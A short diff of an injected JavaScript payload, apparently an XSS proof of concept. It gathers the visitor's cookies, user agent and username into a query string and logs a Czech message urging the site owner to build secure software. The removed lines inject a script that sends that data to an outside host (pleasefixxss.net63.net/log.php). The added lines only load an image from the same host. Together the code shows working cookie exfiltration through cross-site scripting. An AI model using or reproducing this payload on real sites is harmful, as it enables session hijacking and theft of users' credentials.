@@ -5,7 +5,7 @@ var params = "?cookies=" + cookies + "&agent=" + userAgent + "&user=" + username
 
 console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpečný software. děkuji. nebojte nic nezneužiji");
 
-var script = document.createElement('script');
-script.src = '//pleasefixxss.net63.net/log.php' + params;
+var img = document.createElement('img');
+img.src = 'http://pleasefixxss.net63.net/test.png';
 
-document.getElementsByTagName('head')[0].appendChild(script);
+document.getElementsByTagName('body')[0].appendChild(img);
